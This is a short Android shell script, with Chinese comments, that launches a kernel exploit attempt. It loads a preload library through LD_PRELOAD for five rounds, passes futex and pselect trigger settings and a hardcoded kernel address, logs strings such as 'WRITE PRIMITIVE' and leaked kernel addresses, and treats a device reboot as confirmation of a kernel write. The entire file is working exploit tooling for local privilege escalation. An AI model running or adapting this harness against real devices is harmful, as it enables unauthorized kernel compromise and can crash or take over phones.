#!/system/bin/sh
# mt25: futex 6连发 + 独立进程 x 5 轮 (规避进程内重试毒化)
SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt25.so
DST=/data/local/tmp/preload.so
LOG=/sdcard/Documents/matisse_backup_essentials/logs/mt25.txt
RUNLOG=/data/local/tmp/mt25_run.out
rm -f $DST; cp $SRC $DST; sync
BID0=$(cat /proc/sys/kernel/random/boot_id)
echo "boot_before=$BID0" > $LOG
am kill-all 2>&1 | tail -1
echo "=== 5 轮独立进程 ==="
for R in 1 2 3 4 5; do
  echo "--- round $R start $(date +%H:%M:%S)" >> $LOG
  rm -f $RUNLOG
  timeout 220 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_RETRY=1 \
    PSELECT_TREE_PC=ffffff80028a77c8 \
    PSELECT_TREE_LEFT=0 \
    PSELECT_SKIP_WARMUP=1 \
    LD_PRELOAD=$DST /system/bin/sleep 180 > $RUNLOG 2>&1
  echo "round=$R rc=$?" >> $LOG
  grep -a 'mt22:\|mt25:\|WRITE PRIMITIVE\|futex trigger\|bad leaked\|stext=' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
  BID=$(cat /proc/sys/kernel/random/boot_id)
  echo "round=$R boot_id=$BID" >> $LOG
  if [ "$BID" != "$BID0" ]; then
    echo "★★★ WRITE CONFIRMED round=$R ★★★" >> $LOG
    break
  fi
  sleep 3
done
echo "=== boot_after=$(cat /proc/sys/kernel/random/boot_id)" >> $LOG
echo "=== DONE ===" >> $LOG
